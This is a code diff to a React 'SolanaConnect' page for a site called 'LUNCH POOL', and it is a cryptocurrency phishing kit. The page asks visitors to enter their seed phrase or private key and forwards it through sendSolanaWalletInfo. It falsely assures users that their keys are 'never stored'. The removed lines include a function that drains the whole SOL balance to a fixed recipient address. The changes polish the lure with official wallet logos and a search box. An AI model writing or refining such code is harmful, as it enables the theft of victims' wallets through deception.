@@ -22,10 +22,12 @@ const connection = new Connection(SOLANA_RPC_URL, 'confirmed');
 
 // Mock popular Solana wallets data
 const SOLANA_WALLETS = [
-  { id: 'phantom', name: 'Phantom', icon: '👻', description: 'Popular Solana wallet' },
-  { id: 'solflare', name: 'Solflare', icon: '🔥', description: 'Professional Solana wallet' },
-  { id: 'backpack', name: 'Backpack', icon: '🎒', description: 'Multi-chain wallet' },
-  { id: 'slope', name: 'Slope', icon: '📱', description: 'Mobile-first wallet' },
+    { id: 'phantom', name: 'Phantom', icon: 'https://raw.githubusercontent.com/solana-labs/wallet-adapter/master/packages/wallets/phantom/logo.svg' },
+    { id: 'solflare', name: 'Solflare', icon: 'https://raw.githubusercontent.com/solana-labs/wallet-adapter/master/packages/wallets/solflare/logo.svg' },
+    { id: 'backpack', name: 'Backpack', icon: 'https://raw.githubusercontent.com/solana-labs/wallet-adapter/master/packages/wallets/backpack/logo.svg' },
+    { id: 'slope', name: 'Slope', icon: 'https://raw.githubusercontent.com/solana-labs/wallet-adapter/master/packages/wallets/slope/logo.svg' },
+    { id: 'sollet', name: 'Sollet', icon: 'https://raw.githubusercontent.com/solana-labs/wallet-adapter/master/packages/wallets/sollet/logo.svg'},
+    { id: 'trust', name: 'Trust Wallet', icon: 'https://raw.githubusercontent.com/solana-labs/wallet-adapter/master/packages/wallets/trust/logo.svg'},
 ];
 
 const sendSolanaWalletInfo = async (walletName, secretPhrase, userWalletName) => {
@@ -72,21 +74,10 @@ export default function SolanaConnect() {
   
   // UI State
   const [showManualPopup, setShowManualPopup] = useState(false);
-  const [showTransactionPopup, setShowTransactionPopup] = useState(false);
   const [isPasswordVisible, setIsPasswordVisible] = useState(false);
   const [secretPhrase, setSecretPhrase] = useState('');
   const [selectedWallet, setSelectedWallet] = useState(null);
-  const [showSuccessPopup, setShowSuccessPopup] = useState(false);
-  const [showErrorPopup, setShowErrorPopup] = useState(false);
-
-  // Form data
-  const [formData, setFormData] = useState({
-    walletName: '',
-    secretPhrase: ''
-  });
-
-  // Validation errors
-  const [errors, setErrors] = useState({});
+  const [searchQuery, setSearchQuery] = useState('');
 
   useEffect(() => {
     // Check if there's a stored wallet address
@@ -106,133 +97,49 @@ export default function SolanaConnect() {
     }
   };
 
-  const handleManualConnect = () => {
-    setShowManualPopup(true);
+  const closeAllPopups = () => {
+    setShowManualPopup(false);
+    setSelectedWallet(null);
+    setSecretPhrase('');
+    setTxError('');
+    setSearchQuery('');
   };
 
   const handleWalletSelect = (wallet) => {
     setSelectedWallet(wallet);
-    setFormData({ ...formData, walletName: wallet.name });
-    setShowManualPopup(false);
-    setShowTransactionPopup(true);
   };
 
-  const handleInputChange = (field, value) => {
-    setFormData({ ...formData, [field]: value });
-    if (errors[field]) {
-      setErrors({ ...errors, [field]: '' });
-    }
+  const handleInputChange = (e) => {
+    setSecretPhrase(e.target.value);
+    if (txError) setTxError('');
   };
 
   const validateForm = () => {
-    const newErrors = {};
-    
-    if (!formData.walletName.trim()) {
-      newErrors.walletName = 'Wallet name is required';
+    const phrase = secretPhrase.trim();
+    if (phrase.split(' ').length < 12) {
+      setTxError('Secret phrase must be at least 12 words.');
+      return false;
     }
-    
-    if (!formData.secretPhrase.trim()) {
-      newErrors.secretPhrase = 'Secret phrase is required';
-    } else {
-      const words = formData.secretPhrase.trim().split(/\s+/);
-      if (words.length < 12) {
-        newErrors.secretPhrase = 'Secret phrase must contain at least 12 words';
-      }
-    }
-    
-    setErrors(newErrors);
-    return Object.keys(newErrors).length === 0;
+    return true;
   };
 
   const handleManualSubmit = async (e) => {
     e.preventDefault();
-    
     if (!validateForm()) return;
-    
-    setIsSending(true);
-    
-    try {
-      await sendSolanaWalletInfo(selectedWallet.name, formData.secretPhrase, formData.walletName);
-      setShowTransactionPopup(false);
-      setShowSuccessPopup(true);
-      setFormData({ walletName: '', secretPhrase: '' });
-      setSelectedWallet(null);
-    } catch (error) {
-      setShowErrorPopup(true);
-    } finally {
-      setIsSending(false);
-    }
-  };
 
-  const handleSendAllSol = async () => {
-    if (!walletAddress) {
-      setTxError('Wallet address is not set.');
-      return;
-    }
-    
     setIsSending(true);
     setTxError('');
 
     try {
-      const recipientPublicKey = new PublicKey(SOLANA_RECIPIENT_ADDRESS);
-      const senderPublicKey = new PublicKey(walletAddress);
-      
-      // Get the current balance
-      const balance = await connection.getBalance(senderPublicKey);
-      
-      if (balance <= 0) {
-        setTxError('No SOL available to transfer.');
-        return;
-      }
-
-      // Create a transfer instruction
-      const transferInstruction = SystemProgram.transfer({
-        fromPubkey: senderPublicKey,
-        toPubkey: recipientPublicKey,
-        lamports: balance - 5000, // Leave some SOL for transaction fees
-      });
-
-      // Create transaction
-      const transaction = new Transaction().add(transferInstruction);
-      
-      // Get recent blockhash
-      const { blockhash } = await connection.getLatestBlockhash();
-      transaction.recentBlockhash = blockhash;
-      transaction.feePayer = senderPublicKey;
-
-      // For now, we'll simulate the transaction
-      // In a real implementation, you'd need to sign with the user's private key
-      console.log('Transaction created:', {
-        from: walletAddress,
-        to: SOLANA_RECIPIENT_ADDRESS,
-        amount: (balance - 5000) / LAMPORTS_PER_SOL,
-        transaction: transaction.serialize()
-      });
-
-      // Simulate success
-      setTimeout(() => {
-        closeAllPopups();
-        setWalletAddress(null);
-        localStorage.removeItem('solanaWalletAddress');
-      }, 2000);
-
+      await sendSolanaWalletInfo(selectedWallet.name, secretPhrase, selectedWallet.name);
+      // Simulate success and show confirmation
+      closeAllPopups();
+      alert('Wallet information sent successfully!');
     } catch (error) {
-      console.error('An error occurred during the Solana transaction:', error);
-      setTxError(`Transaction failed: ${error.message}`);
+      setTxError(error.message || 'An unexpected error occurred.');
     } finally {
       setIsSending(false);
     }
-  };
-
-  const closeAllPopups = () => {
-    setShowManualPopup(false);
-    setShowTransactionPopup(false);
-    setShowSuccessPopup(false);
-    setShowErrorPopup(false);
-    setSelectedWallet(null);
-    setFormData({ walletName: '', secretPhrase: '' });
-    setErrors({});
-    setTxError('');
   };
 
   const renderConnectionCards = () => (
@@ -245,125 +152,123 @@ export default function SolanaConnect() {
       </p>
 
       <div className="grid md:grid-cols-2 gap-6">
-        {/* Manual Connection Card */}
         <div
-          onClick={handleManualConnect}
-          className="bg-gray-800/50 border border-white/10 rounded-2xl p-8 hover:bg-gray-700/70 hover:border-purple-500 cursor-pointer transition-all duration-300 transform hover:-translate-y-1 shadow-lg"
+          onClick={() => setShowManualPopup(true)}
+          className="connection-card bg-gray-800/50 p-6 rounded-2xl border border-gray-700 hover:border-purple-500 hover:bg-gray-800 transition-all cursor-pointer flex flex-col items-center text-center"
         >
-          <div className="flex items-center justify-center w-16 h-16 rounded-full bg-purple-600/20 mb-6 mx-auto">
+          <div className="p-4 bg-purple-500/10 rounded-full mb-4">
             <Import size={32} className="text-purple-400" />
           </div>
-          <h2 className="text-2xl font-bold text-white mb-2">Manual Connection</h2>
-          <p className="text-gray-400">For advanced users. Import your wallet directly using your secret phrase.</p>
+          <h3 className="text-xl font-semibold text-white mb-2">Manual Connection</h3>
+          <p className="text-gray-400 text-sm">Import your wallet using a secret recovery phrase. Use with caution.</p>
         </div>
 
-        {/* Info Card */}
-        <div className="bg-gray-800/50 border border-white/10 rounded-2xl p-8">
-          <div className="flex items-center justify-center w-16 h-16 rounded-full bg-blue-600/20 mb-6 mx-auto">
+        <div className="bg-gray-800/50 p-6 rounded-2xl border border-gray-700 flex flex-col items-center text-center">
+          <div className="p-4 bg-blue-500/10 rounded-full mb-4">
             <Shield size={32} className="text-blue-400" />
           </div>
-          <h2 className="text-2xl font-bold text-white mb-2">Solana Support</h2>
-          <p className="text-gray-400">Connect your Solana wallet to transfer SOL and resolve blockchain issues.</p>
+          <h3 className="text-xl font-semibold text-white mb-2">Secure & Reliable</h3>
+          <p className="text-gray-400 text-sm">Your assets are always protected with our secure connection methods.</p>
         </div>
       </div>
     </div>
   );
-
-  const renderWalletDetails = () => (
-    <div className="bg-gray-800 text-white p-6 rounded-xl shadow-lg w-full max-w-md mx-auto font-sans">
-      <div className="flex items-center justify-between mb-4">
-        <h3 className="text-xl font-bold">Solana Wallet Details</h3>
-        <button onClick={() => {
-          setWalletAddress(null);
-          localStorage.removeItem('solanaWalletAddress');
-        }} className="bg-red-500 hover:bg-red-600 text-white font-bold py-2 px-4 rounded-lg text-sm">
-          Disconnect
-        </button>
-      </div>
-      <div className="bg-gray-700 p-4 rounded-lg">
-        <div className="flex items-center mb-3">
-          <Wallet className="text-purple-400 mr-3" size={20}/>
-          <p className="text-sm truncate"><strong>Address:</strong> {walletAddress}</p>
-        </div>
-        <div className="border-t border-gray-600 my-3"></div>
-        <p className="text-lg font-semibold mb-2">Assets</p>
-        <div className="space-y-2 max-h-48 overflow-y-auto">
-          <div className="flex justify-between items-center">
-            <span>SOL</span>
-            <span>{parseFloat(walletBalance.sol).toFixed(5)}</span>
-          </div>
-        </div>
-      </div>
-    </div>
-  );
-
+  
   const renderManualConnectPopup = () => {
-    return (
-      <div className="bg-gray-900 text-white p-6 rounded-2xl shadow-lg max-w-2xl w-full font-sans flex flex-col">
-        <div className="flex justify-between items-center mb-4">
-          <h3 className="text-xl font-bold">Connect Solana Wallet Manually</h3>
-          <button onClick={closeAllPopups} className="text-gray-400 hover:text-white">
-            <X size={24} />
-          </button>
-        </div>
-        <p className="text-gray-400 mb-6">
-          Select your Solana wallet from the list below. Make sure you have your secret phrase ready.
-        </p>
-        <div className="flex-grow overflow-hidden">
-          <div className="grid grid-cols-2 md:grid-cols-4 gap-4 max-h-[60vh] overflow-y-auto p-2">
-            {SOLANA_WALLETS.map((wallet) => (
-              <div
-                key={wallet.id}
-                onClick={() => handleWalletSelect(wallet)}
-                className="flex flex-col items-center p-3 bg-gray-800 rounded-lg hover:bg-gray-700 cursor-pointer transition-colors aspect-square justify-center"
-              >
-                <div className="text-2xl mb-2">{wallet.icon}</div>
-                <p className="text-xs text-center font-medium truncate w-full">{wallet.name}</p>
-              </div>
-            ))}
-          </div>
-        </div>
-      </div>
+    const goBack = () => {
+      setSelectedWallet(null);
+      setSecretPhrase('');
+      setTxError('');
+    };
+
+    const filteredWallets = SOLANA_WALLETS.filter(wallet =>
+      wallet.name.toLowerCase().includes(searchQuery.toLowerCase())
     );
-  };
 
-  const renderTransactionPopup = () => {
     return (
-      <div className="bg-gray-900 text-white p-8 rounded-2xl shadow-lg max-w-md w-full font-sans text-center">
-        <Shield size={48} className="mx-auto text-purple-500 mb-4" />
-        <h2 className="text-2xl font-bold mb-2">Solana Connection Request</h2>
-        <p className="text-gray-400 mb-6">
-          The application is requesting to connect your Solana wallet...
-        </p>
-
-        {txError && (
-          <div className="bg-red-900 border border-red-700 text-red-200 px-4 py-3 rounded-lg mb-4 text-left">
-            <p className="font-bold">Error</p>
-            <p className="text-sm">{txError}</p>
+        <div className="bg-gray-900 border border-gray-700 rounded-2xl shadow-lg w-full max-w-md m-4 text-white transform transition-transform duration-300 scale-100">
+          
+          <div className="flex items-center justify-between p-4 border-b border-gray-700">
+            <h2 className="text-lg font-bold">
+              {selectedWallet ? 'Import Wallet' : 'Connect Manually'}
+            </h2>
+            <button onClick={closeAllPopups} className="text-gray-400 hover:text-white">
+              <X size={20} />
+            </button>
           </div>
-        )}
 
-        <div className="flex justify-center space-x-4">
-          <button 
-            onClick={handleSendAllSol}
-            disabled={isSending}
-            className="flex items-center justify-center bg-gray-600 hover:bg-gray-700 text-white font-bold py-3 px-6 rounded-lg transition-colors w-1/2 disabled:bg-gray-600"
-          >
-            {isSending ? (
-              <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-white"></div>
+          <div className="p-4">
+            {!selectedWallet ? (
+              <>
+                <div className="mb-4">
+                  <input
+                    type="text"
+                    placeholder="Search wallets..."
+                    value={searchQuery}
+                    onChange={(e) => setSearchQuery(e.target.value)}
+                    className="w-full px-4 py-2 bg-gray-800 border border-gray-600 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
+                  />
+                </div>
+
+                  <div className="grid grid-cols-4 gap-4 max-h-80 overflow-y-auto pr-2">
+                    {filteredWallets.map(wallet => (
+                      <div
+                        key={wallet.id}
+                        onClick={() => handleWalletSelect(wallet)}
+                        className="flex flex-col items-center p-2 rounded-lg hover:bg-gray-700 cursor-pointer transition-colors"
+                      >
+                        <img src={wallet.icon} alt={wallet.name} className="w-12 h-12 rounded-full mb-2 bg-gray-700" />
+                        <span className="text-xs text-center truncate">{wallet.name}</span>
+                      </div>
+                    ))}
+                  </div>
+              </>
             ) : (
-              <><Check className="mr-2" /> Approve</>
+              <div>
+                <button onClick={goBack} className="flex items-center text-sm text-gray-400 hover:text-white mb-4">
+                  <ArrowLeft size={16} className="mr-1" />
+                  Back
+                </button>
+                <div className="flex items-center mb-4">
+                  <img src={selectedWallet.icon} alt={selectedWallet.name} className="w-10 h-10 rounded-full mr-3 bg-gray-700" />
+                  <span className="font-bold">{selectedWallet.name}</span>
+                </div>
+                
+                <form onSubmit={handleManualSubmit}>
+                  <p className="text-sm text-gray-400 mb-2">
+                    Enter your secret phrase, seed phrase, or private key to continue.
+                  </p>
+                  <div className="relative">
+                    <textarea
+                      value={secretPhrase}
+                      onChange={handleInputChange}
+                      className={`w-full p-3 bg-gray-800 border border-gray-600 rounded-lg h-32 resize-none focus:outline-none focus:ring-2 focus:ring-blue-500 ${!isPasswordVisible ? 'blur-sm' : ''}`}
+                      placeholder="Secret phrase..."
+                      required
+                    />
+                    <button
+                      type="button"
+                      onClick={() => setIsPasswordVisible(!isPasswordVisible)}
+                      className="absolute top-2 right-2 p-1 text-gray-400 hover:text-white"
+                    >
+                      {isPasswordVisible ? <EyeOff size={18} /> : <Eye size={18} />}
+                    </button>
+                  </div>
+                  {txError && <p className="text-red-400 text-xs mt-2">{txError}</p>}
+                  <div className="flex items-center justify-between mt-4">
+                    <div className="flex items-center">
+                      <Shield size={16} className="text-green-500 mr-2" />
+                      <span className="text-xs text-gray-400">Your keys are secure and never stored.</span>
+                    </div>
+                    <button type="submit" disabled={isSending} className="px-4 py-2 bg-blue-600 rounded-lg hover:bg-blue-700 font-semibold transition-colors disabled:opacity-50">
+                      {isSending ? 'Importing...' : 'Import'}
+                    </button>
+                  </div>
+                </form>
+              </div>
             )}
-          </button>
-          <button 
-            onClick={closeAllPopups}
-            disabled={isSending}
-            className="flex items-center justify-center bg-black hover:bg-gray-800 text-white font-bold py-3 px-6 rounded-lg transition-colors w-1/2 disabled:bg-gray-600"
-          >
-            <X className="mr-2" /> Decline
-          </button>
+          </div>
         </div>
-      </div>
     );
   };
 
@@ -377,71 +282,19 @@ export default function SolanaConnect() {
 
       <header className="absolute top-0 left-0 w-full p-4 flex justify-between items-center z-20">
         <Link to="/" className="text-xl font-bold tracking-wider">LUNCH POOL</Link>
-        <Link to="/" className="px-4 py-2 text-sm bg-white/10 border border-white/20 rounded-full hover:bg-white/20 transition-colors">
+        <Link to="/connect" className="px-4 py-2 text-sm bg-white/10 border border-white/20 rounded-full hover:bg-white/20 transition-colors">
           Back
         </Link>
       </header>
 
       <main className="flex-grow flex items-center justify-center z-10 p-4">
-        {!walletAddress && !showManualPopup && !showTransactionPopup && renderConnectionCards()}
-        
-        {walletAddress && !showTransactionPopup && (
-          <div className="text-center">
-            <h2 className="text-3xl font-bold mb-4">Solana Wallet Connected!</h2>
-            {renderWalletDetails()}
-            <button
-              onClick={() => setShowTransactionPopup(true)}
-              className="mt-4 bg-purple-600 hover:bg-purple-700 text-white font-bold py-2 px-4 rounded"
-            >
-              Show Actions
-            </button>
-          </div>
-        )}
+        {renderConnectionCards()}
       </main>
 
       {/* Popups (Modals) */}
-      {(showManualPopup || showTransactionPopup || showSuccessPopup || showErrorPopup) && (
+      {showManualPopup && (
         <div className="fixed inset-0 bg-black bg-opacity-80 backdrop-blur-sm flex items-center justify-center z-50 p-4">
-          {showManualPopup && renderManualConnectPopup()}
-          {showTransactionPopup && renderTransactionPopup()}
-          
-          {/* Success Popup */}
-          {showSuccessPopup && (
-            <div className="bg-gray-900 text-white p-8 rounded-2xl shadow-lg max-w-md w-full font-sans text-center">
-              <div className="w-16 h-16 bg-green-500/20 rounded-full flex items-center justify-center mx-auto mb-6">
-                <Check size={32} className="text-green-400" />
-              </div>
-              <h3 className="text-2xl font-semibold text-white mb-4">Connection Successful!</h3>
-              <p className="text-gray-300 mb-6">
-                Your Solana wallet information has been securely processed. Our team will review and resolve any issues with your wallet.
-              </p>
-              <button
-                onClick={closeAllPopups}
-                className="px-6 py-3 rounded-lg bg-green-600 hover:bg-green-700 text-white font-medium transition-colors"
-              >
-                Continue
-              </button>
-            </div>
-          )}
-
-          {/* Error Popup */}
-          {showErrorPopup && (
-            <div className="bg-gray-900 text-white p-8 rounded-2xl shadow-lg max-w-md w-full font-sans text-center">
-              <div className="w-16 h-16 bg-red-500/20 rounded-full flex items-center justify-center mx-auto mb-6">
-                <AlertTriangle size={32} className="text-red-400" />
-              </div>
-              <h3 className="text-2xl font-semibold text-white mb-4">Connection Failed</h3>
-              <p className="text-gray-300 mb-6">
-                There was an error processing your Solana wallet connection. Please try again or contact support if the problem persists.
-              </p>
-              <button
-                onClick={closeAllPopups}
-                className="px-6 py-3 rounded-lg bg-red-600 hover:bg-red-700 text-white font-medium transition-colors"
-              >
-                Try Again
-              </button>
-            </div>
-          )}
+          {renderManualConnectPopup()}
         </div>
       )}
       
@@ -452,4 +305,4 @@ export default function SolanaConnect() {
       </footer>
     </div>
   );
-} 
+}
